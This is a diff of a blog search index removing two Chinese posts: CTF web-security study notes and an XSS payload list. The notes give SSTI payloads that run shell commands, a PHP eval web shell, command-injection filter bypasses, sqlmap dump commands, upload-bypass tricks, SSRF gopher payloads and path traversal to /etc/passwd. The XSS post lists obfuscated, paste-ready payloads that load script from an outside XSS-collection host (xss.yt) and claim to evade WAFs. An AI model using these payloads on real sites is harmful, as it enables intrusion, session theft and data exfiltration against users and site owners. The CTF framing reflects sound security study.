@@ -1,616 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CyberSafe_Notes</title>
-    <url>/2023/04/19/CyberSafe-Notes/</url>
-    <content><![CDATA[<h2 id="基本的dos命令"><a href="#基本的dos命令" class="headerlink" title="基本的dos命令"></a>基本的dos命令</h2><ul>
-<li><code>dir</code> - 显示当前目录下的文件和子目录</li>
-<li><code>cd &lt;directory&gt;</code> - 更改当前目录到指定目录</li>
-<li><code>mkdir &lt;directory_name&gt;</code> - 创建新目录</li>
-<li><code>rmdir &lt;directory_name&gt;</code> - 删除目录</li>
-<li><code>copy &lt;source&gt; &lt;destination&gt;</code> - 复制文件或目录</li>
-<li><code>move &lt;source&gt; &lt;destination&gt;</code> - 移动文件或目录</li>
-<li><code>del &lt;filename&gt;</code> - 删除文件</li>
-<li><code>rename &lt;old_filename&gt; &lt;new_filename&gt;</code> - 重命名文件或目录</li>
-<li><code>type &lt;filename&gt;</code> - 显示文件的内容</li>
-<li><code>find /i &quot;text&quot; &lt;filename&gt;</code> - 在文件中查找指定的文本</li>
-<li><code>attrib &lt;filename&gt;</code> - 显示或更改文件属性</li>
-<li><code>cls</code> - 清屏</li>
-<li><code>echo &lt;text&gt;</code> - 显示文本</li>
-<li><code>systeminfo</code> - 显示计算机的详细系统信息</li>
-<li><code>gpupdate /force</code> - 强制更新计算机的组策略设置</li>
-<li><code>shutdown /r</code> - 重新启动计算机</li>
-<li><code>shutdown /s</code> - 关闭计算机</li>
-<li><code>ping &lt;hostname_or_ip_address&gt;</code> - 向指定的主机或 IP 发送 ICMP 回显请求以测试网络连接</li>
-<li><code>ipconfig /all</code> - 显示所有网络接口的详细配置信息</li>
-<li><code>ipconfig /release</code> - 释放当前的 IP 地址配置</li>
-<li><code>ipconfig /renew</code> - 重新获取 IP 地址</li>
-<li><code>ipconfig /flushdns</code> - 清空 DNS 解析缓存</li>
-<li><code>netstat -a</code> - 显示所有活动网络连接和侦听端口</li>
-<li><code>netstat -ano</code> - 显示所有活动网络连接、侦听端口及其关联的进程 ID</li>
-<li><code>netstat -r</code> - 显示 IP 路由表</li>
-<li><code>tracert &lt;hostname_or_ip_address&gt;</code> - 显示到指定目标的 IP 数据包路径</li>
-<li><code>nslookup &lt;hostname_or_ip_address&gt;</code> - 查询 DNS，获取指定主机名或 IP 地址的详细信息</li>
-<li><code>arp -a</code> - 显示本地 ARP 缓存表</li>
-<li><code>route print</code> - 显示本地 IP 路由表</li>
-<li><code>nbtstat -A &lt;ip_address&gt;</code> - 获取远程计算机的 NetBIOS 名称表</li>
-<li><code>telnet &lt;hostname_or_ip_address&gt; &lt;port&gt;</code> - 用于远程登录和管理网络设备，需要注意的是 Telnet 传输数据不加密，存在安全隐患</li>
-<li><code>net view</code> - 显示当前域或工作组中的计算机列表</li>
-<li><code>net view \\&lt;computername&gt;</code> - 显示指定计算机上共享的资源列表</li>
-<li><code>net user</code> - 显示用户帐户列表</li>
-<li><code>net user &lt;username&gt;</code> - 显示指定用户帐户的详细信息</li>
-<li><code>net use Z: /delete</code> - 删除指定的网络连接</li>
-<li><code>net user &lt;username&gt;</code> - 显示指定用户的帐户信息</li>
-<li><code>net user &lt;username&gt; *</code> - 更改指定用户的密码</li>
-<li><code>net user &lt;username&gt; /add</code> - 添加新的用户帐户</li>
-<li><code>net user &lt;username&gt; /delete</code> - 删除指定的用户帐户</li>
-<li><code>net localgroup administrators</code> - 显示本地计算机上的管理员组成员</li>
-<li><code>net localgroup administrators &lt;username&gt; /add</code> - 将用户添加到本地计算机的管理员组</li>
-<li><code>net localgroup administrators &lt;username&gt; /delete</code> - 从本地计算机的管理员组中删除用户</li>
-<li><code>net share</code> - 显示当前计算机上的共享资源</li>
-<li><code>net localgroup</code> - 显示本地计算机上的用户组列表</li>
-<li><code>net group</code> - 显示域中的用户组列表</li>
-<li><code>net share</code> - 显示本地计算机上的共享资源列表</li>
-<li><code>net use</code> - 显示计算机上的网络连接</li>
-<li><code>systeminfo</code> - 显示计算机的详细系统信息</li>
-<li><code>whoami /all</code> - 显示当前用户的详细信息，包括用户组和权限</li>
-<li><code>route print</code> - 显示本地 IP 路由表</li>
-<li><code>tracert &lt;hostname_or_ip_address&gt;</code> - 显示到指定目标的 IP 数据包路径</li>
-<li><code>nslookup &lt;hostname_or_ip_address&gt;</code> - 查询 DNS，获取指定主机名或 IP 地址的详细信息</li>
-<li><code>xcopy &lt;source&gt; &lt;destination&gt; /s /e</code> - 复制目录及其子目录，包括空目录</li>
-<li><code>robocopy &lt;source&gt; &lt;destination&gt; /e</code> - 强大的文件复制工具，包括空目录</li>
-<li><code>chkdsk &lt;drive:&gt;</code> - 检查指定磁盘上的磁盘错误</li>
-<li><code>sfc /scannow</code> - 扫描系统文件并修复错误</li>
-<li><code>gpresult /r</code> - 显示用户的组策略设置报告</li>
-<li><code>tasklist</code> - 显示当前运行的进程</li>
-<li><code>taskkill /im &lt;process_name&gt; /f</code> - 强制终止指定的进程</li>
-<li><code>assoc &lt;file_extension&gt;</code> - 显示或修改文件扩展名关联</li>
-<li><code>ftype &lt;file_type&gt;</code> - 显示或修改文件类型</li>
-<li><code>compact &lt;filename&gt;</code> - 显示或修改 NTFS 分区上文件的压缩状态</li>
-<li><code>diskpart</code> - 运行磁盘分区实用程序</li>
-<li><code>tree &lt;directory&gt;</code> - 以树形结构显示目录及其子目录</li>
-<li><code>title &lt;text&gt;</code> - 更改命令提示符窗口的标题</li>
-<li><code>color &lt;color_code&gt;</code> - 更改命令提示符窗口的文本和背景颜色</li>
-<li><code>set</code> - 显示、设置或删除环境变量</li>
-<li><code>path</code> - 显示或设置可执行文件的搜索路径</li>
-<li><code>hostname</code> - 显示计算机的主机名</li>
-<li><code>whoami</code> - 显示当前用户的用户名和域</li>
-<li><code>pause</code> - 暂停批处理文件的处理，等待用户按任意键</li>
-<li><code>timeout /t &lt;seconds&gt;</code> - 在批处理文件中添加延时</li>
-</ul>
-<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h3><ul>
-<li>GET请求<ul>
-<li>请求行：包括请求方法（GET）、请求资源的路径（&#x2F;index.html）以及HTTP协议版本（HTTP&#x2F;1.1）</li>
-<li>请求头：包含了客户端提供的额外信息，如Host（目标主机名）、User-Agent（浏览器信息）、Accept（可接受的内容类型）等</li>
-<li>请求体：GET请求通常不包含请求体，因为GET请求主要用于获取资源，而不是发送数据</li>
-</ul>
-</li>
-</ul>
-<pre><code class="bash">GET /index.html HTTP/1.1
-Host: www.example.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Connection: keep-alive
-</code></pre>
-<ul>
-<li>GET响应<ul>
-<li>状态行：包括HTTP协议版本（HTTP&#x2F;1.1）、状态码（200）和状态描述（OK）</li>
-<li>响应头：包含了服务器提供的额外信息，如Date（响应时间）、Server（服务器软件信息）、Content-Type（资源类型）、Content-Length（资源大小）等</li>
-<li>响应体：包含了请求的资源内容，如HTML文档、图片数据等</li>
-</ul>
-</li>
-</ul>
-<pre><code class="bash">HTTP/1.1 200 OK
-Date: Fri, 21 Apr 2023 08:23:19 GMT
-Server: Apache
-Content-Type: text/html; charset=UTF-8
-Content-Length: 12345
-Connection: keep-alive
-Last-Modified: Mon, 10 Apr 2023 14:00:00 GMT
-ETag: &quot;1a2b3c4d&quot;
-
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;Example Page&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;h1&gt;Hello, World!&lt;/h1&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<h3 id="vim-交换文件名"><a href="#vim-交换文件名" class="headerlink" title="vim 交换文件名"></a>vim 交换文件名</h3><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
-<blockquote>
-<p>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp<br>再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>第三次产生的交换文件则为 .index.php.swn</p>
-</blockquote>
-<h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><pre><code class="bash">cd dirsearch
-python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php
-</code></pre>
-<h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><pre><code class="bash">.DS_Store(Desktop Services Store)是macOS目录下的隐藏文件, 包含了当前目录结构和一些的自定义信息, 如背景和图标位置等, 在windows下类似的文件为desktop.ini. 暴露了.DS_Store文件也就相当于暴露了该目录下的所有内容. 可以说是比较严重的泄露.
-</code></pre>
-<h3 id="Git泄漏"><a href="#Git泄漏" class="headerlink" title="Git泄漏"></a>Git泄漏</h3><pre><code class="bash">githacker --url http(s)://xxxxxx --output-folder ~/target
-cd target
-git log
-git diff xxxx
-git stash list 
-git stash pop
-git reflog 历史
-//
-wget -r url/.git
-</code></pre>
-<h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><ul>
-<li>扫描 <code>binwalk 图片路径</code></li>
-<li>分离<ul>
-<li><code>dd if=图片路径 of output.zip skip=xx(按扫描出来的大小填写) bs=1</code></li>
-<li><code>foremost -v -i 图片路径 -o /Users/dionysus/Desktop/recovered_data</code></li>
-</ul>
-</li>
-<li>解压<ul>
-<li><code>unzip -l output.zip</code></li>
-<li><code>unzip output.zip</code></li>
-</ul>
-</li>
-<li>获取密码<ul>
-<li>暴力破解<code>fcrackzip -b -c &#39;aA1&#39; -l 1-10 -u /Users/dionysus/output.zip</code></li>
-<li>分析进制数据 （  010editor  ）</li>
-<li>图片移入<ul>
-<li>查看数据</li>
-<li>修改宽高<ul>
-<li>待</li>
-<li>补</li>
-<li>充</li>
-</ul>
-</li>
-<li>more···</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<pre><code class="bash">附录
-PNG (png)，文件头(hex)：89504E47
-PNGImageFile (png), 文件头(hex)：89504E470D0A
-JPEG (jpg)， 文件头(hex)：FFD8FF
-GIF (gif)，文件头(hex)：47494638
-TIFF (tif)，文件头(hex)：49492A00
-GzipArchiveFile (gz;tar;tgz), 文件头(hex)：1F8B
-AdobeAcrobat (pdf), 文件头(hex)：255044462D312E
-EXE（EXE）， 文件头(hex)：4D5A90
-Windows Bitmap (bmp)，文件头(hex)：424D
-CAD (dwg)，文件头(hex)：41433130
-Adobe Photoshop (psd)，文件头(hex)：38425053
-Rich Text Format (rtf)，文件头(hex)：7B5C727466
-XML (xml)，文件头(hex)：3C3F786D6C
-HTML (html)，文件头(hex)：68746D6C3E
-Email [thorough only] (eml)，文件头(hex)：44656C69766572792D646174653A
-Outlook Express (dbx)，文件头(hex)：CFAD12FEC5FD746F
-Outlook (pst)，文件头(hex)：2142444E
-MS Word/Excel (xls.or.doc)，文件头(hex)：D0CF11E0
-MS Access (mdb)，文件头(hex)：5374616E64617264204A
-WordPerfect (wpd)，文件头(hex)：FF575043
-Postscript (eps.or.ps)，文件头(hex)：252150532D41646F6265
-Adobe Acrobat (pdf)，文件头(hex)：255044462D312E
-Quicken (qdf)，文件头(hex)：AC9EBD8F
-Windows Password (pwl)，文件头(hex)：E3828596
-ZIP Archive (zip)，文件头(hex)：504B0304
-RAR Archive (rar)，文件头(hex)：52617221
-Wave (wav)，文件头(hex)：57415645
-AVI (avi)，文件头(hex)：41564920
-Real Audio (ram)，文件头(hex)：2E7261FD
-Real Media (rm)，文件头(hex)：2E524D46
-MPEG (mpg)，文件头(hex)：000001BA
-MPEG (mpg)，文件头(hex)：000001B3
-Quicktime (mov)，文件头(hex)：6D6F6F76
-Windows Media (asf)，文件头(hex)：3026B2758E66CF11
-MIDI (mid)，文件头(hex)：4D546864
-</code></pre>
-<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p><code>&#123;&#123;config.items()&#125;&#125;</code>- Jinja2引擎解析这个字符串时，它会返回一个包含所有配置项的列表<br><code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls ../').read() &#125;&#125;</code>读取系统文件<br><code>import os os.system(&#39;ls ../&#39;) os.system(&#39;cat ../flag&#39;)</code></p>
-<pre><code class="bash">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
-&#123;% if c.__name__ == 'catch_warnings' %&#125;
-  &#123;% for b in c.__init__.__globals__.values() %&#125;
-  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
-    &#123;% if 'eval' in b.keys() %&#125;
-      &#123;&#123; b['eval']('__import__("os").popen("env").read()') &#125;&#125;
-    &#123;% endif %&#125;
-  &#123;% endif %&#125;
-  &#123;% endfor %&#125;
-&#123;% endif %&#125;
-&#123;% endfor %&#125;
-</code></pre>
-<h3 id="svn泄漏"><a href="#svn泄漏" class="headerlink" title="svn泄漏"></a>svn泄漏</h3><pre><code class="bash">工具：dvcs-ripper tree
-cd dvcs-ripper
-perl ./rip-svn.pl -v -u url/.svn/
-#ls -la -&gt; ls -la.svn
-tree -a .svn #-a代表显示隐藏文件
-cat ...#根据具体文件查看信息
-</code></pre>
-<h3 id="hg泄漏"><a href="#hg泄漏" class="headerlink" title="hg泄漏"></a>hg泄漏</h3><pre><code class="bash">perl ./rip-hg.pl -v -u http://challenge-02ead012a55810f3.sandbox.ctfhub.com:10800/.hg
-</code></pre>
-<h3 id="查询具体所含数据"><a href="#查询具体所含数据" class="headerlink" title="查询具体所含数据"></a>查询具体所含数据</h3><p><code>grep -ir flag</code>这是一个使用 grep 命令在文件中搜索特定字符串（本例中为 “flag”）的命令行指令。-i 选项表示大小写不敏感，-r 选项表示递归搜索文件夹</p>
-<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>-弱</p>
-<p>-常用</p>
-<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h3><pre><code class="bash">！！！！！！结尾要带分号！！！！！！
-&lt;?php
-if (isset($_REQUEST[&#39;cmd&#39;])) &#123;
-    eval($_REQUEST[&quot;cmd&quot;]);
-&#125; else &#123;
-    highlight_file(__FILE__);
-&#125;
-?&gt;
-
-
-system(&quot;ls /&quot;);
-system(&quot;cat /flag&quot;);
-phpinfo();
-</code></pre>
-<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><pre><code class="bash">#函数查找字符串在另一字符串中第一次出现的位置（区分大小写） 
-#strpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);
-...url/?file=shell.txt
-构造post：ctfhub=system(&quot;cat /flag&quot;);
-</code></pre>
-<ul>
-<li>php:&#x2F;&#x2F;input#从输入中读取</li>
-</ul>
-<p>eg: <code>&lt;?php system(&quot;ls&quot;);?&gt;</code></p>
-<ul>
-<li>php:&#x2F;&#x2F;filter</li>
-</ul>
-<p><code>php://filter/read=filter_name/resource=resource_url</code><br>filter_name：要应用的过滤器名称<br>resource_url：要读取的资源的URL<br>eg:<code>file=php://filter/read=convert.base64-encode/resource=/flag</code></p>
-<p>127.0.0.1&amp; cat 1382668722644.php | base64</p>
-<pre><code class="bash">file | base64也可以写成base64 file
-
-代替cat
-cat 由第一行开始显示内容，并将所有内容输出
-tac 从最后一行倒序显示内容，并将所有内容输出
-more 根据窗口大小，一页一页的现实文件内容
-less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符
-head 只显示头几行
-tail 只显示最后几行
-nl 类似于cat -n，显示时输出行号
-tailf 类似于tail -f
-在 bash 下, 可以用以下字符代替空格:&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, $&#123;IFS&#125;,$IFS
-</code></pre>
-<ul>
-<li><p>%0a：表示换行符（newline），用于在字符串或文本中表示一个新行的开始。在ASCII编码中，它对应于十进制值10。</p>
-</li>
-<li><p>%0d：表示回车符（carriage return），用于将光标移动到当前行的开始。在ASCII编码中，它对应于十进制值13。在某些环境中，回车符和换行符一起用于表示新行（例如，Windows中的\r\n）。</p>
-</li>
-<li><p>;：分号在许多编程语言中用于分隔语句。在命令行环境中，如Unix和Linux Shell，分号用于在同一行上执行多个命令，命令会按顺序执行，不考虑前一个命令的执行结果。</p>
-</li>
-<li><p>&amp;：在命令行环境中，&amp;符号通常用于将命令放入后台运行，允许用户在命令执行时继续使用命令行。在某些编程语言中，&amp;还可以表示按位与（bitwise AND）操作。</p>
-</li>
-<li><p>|：管道符，用于在命令行环境中将一个命令的输出作为另一个命令的输入。这使得用户可以将多个操作链接在一起，从而创建复杂的数据处理管道。</p>
-</li>
-<li><p>&amp;&amp;：在命令行环境中，&amp;&amp;用于将多个命令链接在一起，使得只有在前一个命令成功执行（返回值为0）时，才会执行下一个命令。在某些编程语言中，&amp;&amp;表示逻辑与（logical AND）操作。</p>
-</li>
-<li><p>||：在命令行环境中，||用于将多个命令链接在一起，使得只有在前一个命令失败执行（返回值非0）时，才会执行下一个命令。在某些编程语言中，||表示逻辑或（logical OR）操作。</p>
-</li>
-<li><p><code>ping 127.0.0.1 &amp; ls</code>：<code>&amp;</code>符号将 <code>ping 127.0.0.1</code> 命令放入后台运行，而不会阻塞命令行界面。在 <code>ping</code> 命令开始执行后，<code>ls</code> 命令会立即执行。这里，<code>ping</code> 和 <code>ls</code> 命令几乎同时运行，它们之间没有依赖关系。</p>
-</li>
-<li><p><code>ping 127.0.0.1 &amp;&amp; ls</code>：<code>&amp;&amp;</code> 符号表示只有在前一个命令成功执行（返回值为0）时，才会执行下一个命令。在这个例子中，<code>ls</code> 命令只有在 <code>ping 127.0.0.1</code> 命令成功执行后才会执行。然而，<code>ping</code> 命令在默认情况下会持续执行，你需要手动停止它（例如，按 <code>Ctrl+C</code>）才能让 <code>ls</code> 命令执行。</p>
-</li>
-<li><p><code>ping 127.0.0.1 | ls</code>：<code>|</code> 符号是管道符，表示将前一个命令的输出作为后一个命令的输入。然而，在这个例子中，这种用法是不正确的，因为 <code>ls</code> 命令本身不接受来自其他命令的输入。因此，这个命令可能会导致错误或不可预期的行为。</p>
-</li>
-<li><p><code>ping 127.0.0.1 ; ls</code>： <code>;</code> 符号表示在同一行上执行多个命令。命令会按顺序执行，不考虑前一个命令的执行结果。在这个例子中，<code>ping 127.0.0.1</code> 命令会首先执行，然后在其完成后（需要手动停止，例如按 Ctrl+C），<code>ls</code> 命令会立即执行。</p>
-</li>
-</ul>
-<p>过滤小结:</p>
-<ul>
-<li>过滤cat:</li>
-</ul>
-<pre><code class="bash">  ca/t ca&quot;&quot;t ca&#39;&#39;t
-  拼接 a=ca;b=t;$a$b
-</code></pre>
-<ul>
-<li>过滤空格: <code>&lt;,&lt;&gt;,$&#123;IFS&#125;</code></li>
-<li>过滤运算分隔符号:<code>;-&gt;%0a</code> <code>file | base64-&gt; base64 file</code> <code>/-&gt;cd$&#123;IFS&#125;</code></li>
-</ul>
-<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><pre><code class="bash">1.sqlmap -u &quot;目标网址/?id=1&quot; --dbs
-2.sqlmap -u &quot;目标网址&quot; -D [数据库名] --tables
-3.sqlmap -u &quot;目标网址&quot; -D [数据库名] -T [表名] --columns
-4.sqlmap -u &quot;目标网址&quot; -D [数据库名] -T [表名] -C [列名] --dump
-#
-报错注入: sqlmap -u [目标url] --current-db --batch --threads 10 --technique E 
-布尔盲注: sqlmap -u [目标url] --current-db --batch --threads 10 --technique B
-时间盲注: sqlmap -u [目标url] --current-db --batch --threads 10 --technique T -v 3
-
-POST注入（*标识哪里 就对哪里进行打击）
-sqlmap -u &quot;目标url&quot; --data &quot;uname=admin*&amp;passwd=admin&amp;submit=Submit&quot; --dbs --batch --threads 10 --technique E
-
-SQLmap实现Http-header头注入之 
-1.User-Agent注入 ：
-#在使用请求头注入的时候，--level必须大于3
-
-sqlmap -u [目标url] --user-agent=&quot;抓包得到的对应的内容*&quot; --level 4 --dbs --threads 10 --batch --technique E
-
-2.Cookie注入 ：
-// sqlmap -u [目标url] --cookie=&quot;原来*的cookie内容&quot; --level 4 --dbs --threads 10 --batch --technique E
-
-
-
-#一些补充
---technique B 布尔盲注 
---technique E 报错注入
---technique U union查询注入
---technique S 堆叠注入
---technique T 时间盲注
---technique Q 内联查询注入
-
-脚本绕过限制 
-eg：sqlmap -u &quot;目标网址&quot; -D [数据库名] -T [表名] -C [列名] --dump --tamper &quot;space2comment.py&quot;
-
-space2comment.py    -- 作用是用注释/**/替换空格字符&#39; &#39;
-equaltolike.py      -- 作用是用like代替等号
-apostrophemask.py   -- 作用是用utf8代替引号
-greatest.py         -- 作用是绕过过滤&#39;&gt;&#39; ,用GREATEST替换大于号
-</code></pre>
-<p>为什么<code>username=xxx&#39;or&#39;1=1&amp;password=xxx&#39;or&#39;1=1</code>可以达到SQL注入，从而直接输出表内容的目的。</p>
-<p>假设我们的表名叫<code>t_user</code>，<code>username</code>为用户名字段，<code>password</code>为密码字段，只有当用户名和密码字段都正确的时候才能输出该数据的内容</p>
-<p><code>SELECT * FROM t_user WHERE username = &#39;xxx&#39; AND password = &quot;xxxx&quot;</code><br>但是我们通过在xxx后面拼接一个’号来闭合<code>username</code>的值，然后通过<code>or 1 = 1</code>使where的条件恒等于true，上面的SQL也就变成了</p>
-<p><code>SELECT * FROM t_user WHERE username=&#39;xxx&#39;or 1 = 1 AND password=&#39;xxx&#39;or 1 = 1</code><br>从而可以查出所有的数据。</p>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><blockquote>
-<p>工具：蚁剑</p>
-</blockquote>
-<ul>
-<li>一句话木马 <code>&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;</code></li>
-</ul>
-<p>上传文件绕过限制：</p>
-<blockquote>
-<ul>
-<li>前端验证: 关闭前端js 或许改后缀名bp重发</li>
-<li>.htaccess: 传入.htaccess文件内容为<code>AddType application/x-httpd-php x</code>or<code>SetHandler application/x-httpd-php</code></li>
-</ul>
-<p>#x为格式 如.jpg .png 作用是用php格式打开这些文件，然后把一句话木马以对应后缀上传即可。(后者为把所有文件当成php处理)</p>
-<ul>
-<li>00截断:用户输入的url参数包含%00经过浏览器自动转码后截断后面字符.</li>
-</ul>
-<p>#需要注意的是 将<code>POST /?road=/var/www/html/upload/ HTTP/1.1</code>改为<code>POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1</code>。而不是更改 <code>filename=&quot;shell.png&quot;</code>为<code>filename=&quot;shell.php%00png</code></p>
-<ul>
-<li>文件头检测:对于某些限制png jpg等格式上传的，会对其文件头进行检测。如png 只需在一句话木马二进制文件前加上<code>89504E47</code> 再用bp重发，蚁剑连接。</li>
-<li>双写后缀:可能在出现<code>php php5 ajax</code>等后缀置为空白，构造<code>pphphp</code>后缀，则会置为php后缀</li>
-<li>MIME绕过:如下所示</li>
-</ul>
-</blockquote>
-<pre><code class="bash">1.先对于服务器上传不同的文件，直至上传成功，然后利用BS进行抓包。查看报文的最后一段有Content-type字段部分
-2.上传木马，修改Content-type
-3.使用antSword进行连接
-</code></pre>
-<p>蚁剑，一句话木马，bp重发请求文件上传，配置文件绕过限制<br>数据库漏洞</p>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><pre><code class="bash">file:///
-#file:///var/www/html/flag.php
-dict://
-#探测内网端口协议
-sftp://
-ldap://
-tftp://
-gopher://(万金油)
-</code></pre>
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>bp 攻击<br><code>url=dict://127.0.0.1:8000</code><br><code>$8000$负载number8000-9000 step:1</code></p>
-<p>扫描找到数据字节不同的端口重发<br><code>http://127.0.0.1:xxxx</code></p>
-<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><h4 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h4><p>最终gopher协议伪造的http请求<br><code>POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250Ahost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D5b69b89c146e1ed3b90708ffa267f06a</code><br>三次URL解码得到的玩意:</p>
-<pre><code class="bash">POST /flag.php HTTP/1.1
-host: 127.0.0.1:80
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 36
-key=5b69b89c146e1ed3b90708ffa267f06a
-</code></pre>
-<p>(但是我真的没看懂，日后再说)<br>大佬牛b！！！</p>
-<pre><code class="python">import urllib.parse
-
-payload =\
-&quot;&quot;&quot;
-yourpayload
-&quot;&quot;&quot;  # 注意后面一定要有回车，回车结尾表示http请求结束
-
-tmp = urllib.parse.quote(payload)
-new = tmp.replace(&#39;%0A&#39;, &#39;%0D%0A&#39;)
-new = urllib.parse.quote(new)
-result = &#39;gopher://127.0.0.1:80/&#39; + &#39;_&#39; + new
-result = urllib.parse.quote(result)
-print(result)
-</code></pre>
-<p><code>GET /?url=http://127.0.0.1:80/index.php?url=result   HTTP/1.1</code>重发即可</p>
-<h2 id="一些漏洞"><a href="#一些漏洞" class="headerlink" title="一些漏洞"></a>一些漏洞</h2><p>对于某些漏洞，查询版本即可<br>如phpmyadmin 4.80&#x2F;4.81</p>
-<ul>
-<li><code>?target=db_datadict.php%253f../../../../../../etc/passwd</code></li>
-<li><code>?target=db_datadict.php%253f../../../../../../flag</code><br>即可获取flag</li>
-</ul>
-<p>qs:<br>qs是负责url参数转换js库。</p>
-<p>简单用法：foo[bar]&#x3D;baz–&gt;</p>
-<pre><code class="bash">assert.deepEqual(qs.parse(&#39;foo[bar]=baz&#39;),&#123;
-    foo:&#123;
-      bar:&#39;baz&#39;
-    &#125;
-&#125;);
-#可嵌套对象
-#   foo:&#123;
-#     bar:&#123;
-#         baz：&#39;foobarbaz&#39;
-#     &#125;
-#   &#125;
-</code></pre>
-<p>url:a&#x3D;b&amp;proxy&#x3D;nginx–&gt;<br><code>&#123;a:&#39;b&#39;,proxy:&#39;nginx&#39;&#125;</code><br>qs最多解析1000个参数<br>所以<br>answer: <code>url/?a=1&amp;a=1.............</code></p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS</title>
-    <url>/2023/04/16/XSS/</url>
-    <content><![CDATA[<p><a href="https://xss.yt/index/user.html">XSS平台</a></p>
-<pre><code class="bash">将如下代码植入怀疑出现xss的地方（注意&#39;的转义），即可在 项目内容 观看XSS效果。
-
-当前项目URL地址为：https://xss.yt/YLgl        【注意新增https，插入对方网站代码前缀http或者https都可】
-
-&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xss.yt/YLgl&gt;&lt;/sCrIpT&gt;
-或者
-
-&#39;&quot;&gt;&lt;input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus&gt;
-&#39;&quot;&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&gt;
-&#39;&quot;&gt;&lt;video&gt;&lt;source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&gt;
-&#39;&quot;&gt;&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;https://xss.yt/YLgl&quot;);a.send();&lt;/script&gt;
-&lt;img src=x onerror=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;//xss.yt/YLgl&#39;;&gt;
-下方XSS代码过一般WAF [注意如果直接把代码放入Burp，111则需要把下方代码进行URL编码]
-
-&lt;embed src=https://xss.yt/liuyan/xs.swf?a=e&amp;c=docu0075ment.write(Stu0072ing.fromu0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash&gt;&lt;/embed&gt;
-若使用下方XSS代码请注意(下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选&quot;基础默认XSS&quot;模块)
-
-&lt;img src=&quot;&quot; onerror=&quot;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62))&quot;&gt;
